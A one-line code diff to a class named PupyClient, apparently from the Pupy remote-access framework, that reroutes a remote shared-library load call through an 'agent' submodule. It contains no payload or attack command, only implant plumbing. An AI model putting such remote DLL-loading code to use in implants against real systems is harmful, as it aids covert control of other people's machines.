@@ -433,7 +433,7 @@ class PupyClient(object):
         if self.pupy_load_dll:
             result = self.pupy_load_dll(name, buf)
         else:
-            result = self.conn.modules.pupy.load_dll(name, buf)
+            result = self.conn.modules.pupy.agent.load_dll(name, buf)
 
         if not result:
             raise ImportError('Couldn\'t load shared object {}'.format(name))
